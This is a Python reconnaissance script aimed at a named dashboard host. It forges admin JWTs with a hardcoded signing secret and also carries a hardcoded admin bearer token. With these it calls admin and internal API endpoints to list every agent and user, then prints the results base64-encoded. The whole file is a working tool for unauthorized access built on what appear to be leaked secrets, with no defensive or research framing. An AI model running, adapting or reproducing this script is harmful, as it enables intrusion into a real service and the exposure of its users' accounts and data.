#!/usr/bin/env python3
# i29311 recon: enumerate all agents + users via dashboard admin API from clean runner egress
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie=None,bearer=None,timeout=30,maxlen=200000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-w","\n__CODE__%{http_code}"]
    if cookie: a+=["-H","Cookie: session="+cookie]
    if bearer: a+=["-H","Authorization: Bearer "+bearer]
    a+=["https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}

def main():
    TOK = tok_for("usr_ZxLewKrgbRYSm7rWDtQX8","aro")
    R("me", call("/api/me", cookie=TOK))
    # try multiple enumeration endpoints
    R("admin_agents_bearer", call("/api/admin/agents", bearer=ADMIN_TOKEN))
    R("admin_agents_cookie", call("/api/admin/agents", cookie=TOK))
    R("agents_cookie", call("/api/agents", cookie=TOK))
    R("internal_connected",
      call("/api/internal/connected-agents", bearer=ADMIN_TOKEN))
    # try users
    R("admin_users", call("/api/admin/users", cookie=TOK))
    R("users", call("/api/users", cookie=TOK))
try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally: sys.exit(0)
